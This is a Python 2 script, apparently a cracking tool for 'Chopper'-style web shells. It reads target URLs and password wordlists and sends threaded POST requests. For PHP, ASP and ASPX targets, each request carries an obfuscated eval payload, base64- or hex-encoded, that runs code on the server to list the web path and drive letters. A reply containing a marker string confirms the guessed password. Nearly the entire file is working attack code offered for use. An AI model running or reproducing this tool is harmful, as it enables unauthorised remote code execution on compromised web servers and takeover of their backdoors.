# !/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import glob
import time
import socket
import requests
import argparse
import threading
from Queue import Queue

reload(sys)
sys.setdefaultencoding('utf-8')

socket.setdefaulttimeout(10)

mutex = threading.Lock()


class MyThread(threading.Thread):
    def __init__(self, func):
        super(MyThread, self).__init__()
        self.func = func
    def run(self):
        self.func()


class Brute():
    def __init__(self):
        self.dicts=[]
        self.targets=[]
        self.tasks_queue = Queue()
        self.header = {
                       'Accept-Language': 'zh-cn',
                       'Accept': '*/*',
                       'Cache-Control': 'no-cache',
                       'Connection': 'Keep-Alive',
                       'Content-Type': 'application/x-www-form-urlencoded',
                       'User-Agent':'Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0'
                       }


    def get_targets(self,_file, url):
        if _file:
            for i in [x.strip() for x in file(_file)]:
                self.targets.append(i)
        if url:
            self.targets.append(url.strip())
        return len(set(self.targets))

    def get_dict(self):
        for logfile in glob.glob('*.list'):
            with open(logfile, "rb") as f:
                for line in f.readlines():
                    self.dicts.extend(line.split())
        return len(self.dicts)

    def println(self,url, pwd):
        mutex.acquire()
        print url + ' ' * 5 +'密码：'+ pwd
        mutex.release()



    def worker(self):
        while self.tasks_queue.qsize() > 0:
            url,lang=self.tasks_queue.get(timeout=0.1)
            if lang =='php':
                for pwd in self.dicts:
                    data= '{}=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7ZWNobyAkRC4iXHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCRMLiI6IikpZWNobygkTC4iOiIpO307ZWNobygifDwtIik7ZGllKCk7'.format(pwd)
                    try:
                        req=requests.post(url=url,data=data,headers=self.header)
                        if req.status_code==200 and '->'in req.content:
                            self.println(url,pwd)
                            break
                    except BaseException as e:
                        continue
                break
            elif lang =='asp':
                for pwd in self.dicts:
                    data='{}=eval("Ex"%26cHr(101)%26"cute(""Server.ScriptTimeout%3D3600:On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(""""->|""""):Ex"%26cHr(101)%26"cute(""""On+Error+Resume+Next:""""%26bd(""""44696D20533A53455420433D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A496620457272205468656E3A533D224552524F523A2F2F2022264572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A533D5365727665722E4D61707061746828222E2229266368722839293A466F722045616368204420696E20432E4472697665733A533D5326442E44726976654C657474657226636872283538293A4E6578743A456E642049663A526573706F6E73652E5772697465285329"""")):Response.Write(""""|<-""""):Response.End"")")'.format(pwd)
                    try:
                        req = requests.post(url=url, data=data, headers=self.header)
                        if req.status_code == 200 and '->' in req.content:
                            self.println(url, pwd)
                            break
                    except BaseException as e:
                        continue
                break
            elif lang =='aspx':
                for pwd in self.dicts:
                    data='{}=Response.Write("->|");var err:Exception;try{{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIGM9U3lzdGVtLklPLkRpcmVjdG9yeS5HZXRMb2dpY2FsRHJpdmVzKCk7UmVzcG9uc2UuV3JpdGUoU2VydmVyLk1hcFBhdGgoIi4iKSsiCSIpO2Zvcih2YXIgaT0wO2k8PWMubGVuZ3RoLTE7aSsrKVJlc3BvbnNlLldyaXRlKGNbaV1bMF0rIjoiKTs%3D")),"unsafe");}}catch(err){{Response.Write("ERROR:// "%2Berr.message);}}Response.Write("|<-");Response.End();'.format(pwd)
                    try:
                        req = requests.post(url=url, data=data, headers=self.header)
                        if req.status_code == 200 and '->' in req.content:
                            self.println(url, pwd)
                            break
                    except BaseException as e:
                        continue
            elif lang =='jsp':
                pass
            elif lang =='jspx':
                pass



    def monitor(self):
        while not self.tasks_queue.empty():
            print "{} tasks waiting...".format(self.tasks_queue.qsize())
            time.sleep(30)


    def scan(self,lang,thread=1):
        threads=[]
        print "Now start broken....."
        self.get_dict()
        for url in self.targets:
            self.tasks_queue.put((url,lang))
        print "Total has %s records to broken..." % (self.tasks_queue.qsize())
        for i in xrange(thread):
            thread = MyThread(self.worker)
            thread.start()
            threads.append(thread)
        self.monitor()
        for thread in threads :
            thread.join()


def cmdLineParser():
    parser = argparse.ArgumentParser(usage='python %s -u http://www.xx.cn/x.asp '%__file__)
    parser.add_argument('-f','--file',metavar="",help='chopper urls filename')
    parser.add_argument('-u','--url',metavar="",type=str,help='Like "http://www.xx.com/shell.php"')
    parser.add_argument('-l', '--lang', metavar="", type=str, help='Like "php|asp|aspx|"')
    parser.add_argument('-t','--threads',metavar="",default=1,type=int,help='THREADS')

    if len(sys.argv) == 1:
        sys.argv.append('-h')
    args = parser.parse_args()
    return args


if __name__ == '__main__':
    brup=Brute()
    args=cmdLineParser()
    targets=brup.get_targets(args.file,args.url)
    if not targets:
        print "Targets missing...."
    elif not args.lang:
        print "Script type missing..."
    else:
        brup.scan(args.lang,args.threads)



